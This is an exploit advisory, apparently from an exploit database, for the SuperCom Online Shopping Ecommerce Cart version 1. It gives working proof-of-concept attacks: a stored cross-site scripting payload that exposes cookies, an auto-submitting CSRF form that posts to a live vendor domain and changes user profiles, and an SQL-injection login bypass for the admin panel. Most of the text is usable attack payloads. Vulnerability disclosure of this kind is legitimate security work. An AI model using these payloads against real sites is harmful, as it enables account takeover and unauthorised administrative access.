@@ -1,0 +1,38 @@
+# Exploit Title: SuperCom Online Shopping Ecommerce Cart 1 - Persistent Cross-Site scripting / Cross site request forgery / Authentication bypass
+# Date: 2018-05-17
+# Exploit Author: L0RD
+# Vendor Homepage: https://codecanyon.net/item/supercom-online-shopping-ecommerce-cart/17085987?s_rank=1442
+# Version: 1
+# Tested on: Kali linux
+
+# Description: SuperCom - Online Shopping Ecommerce Cart 1 suffers from multiple vulnerabilities :
+# POC 1 : Persistent cross site scripting :
+
+1) After creating an account , go to your profile.
+2) Navigate to "Update profile" and put this payload :
+"/><script>alert(document.cookie)</script>
+3) You will get an alert box in the page .
+
+# POC 2 : CSRF : Attacker can change user's authentication directly :
+
+<html>
+<head>
+    <title>CSRF POC</title>
+</head>
+<body>
+    <form action="http://ecommerce.thesoftking.com/updateprofile"
+method="post">
+        <input type="hidden" name="name" value="anything">
+        <input type="hidden" name="mobile" value="1000000000">
+        <input type="hidden" name="address" value="anything">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+# POC 3 : Authentication bypass :
+Path : /admin
+Username : ' or 0=0 #
+Password : anything
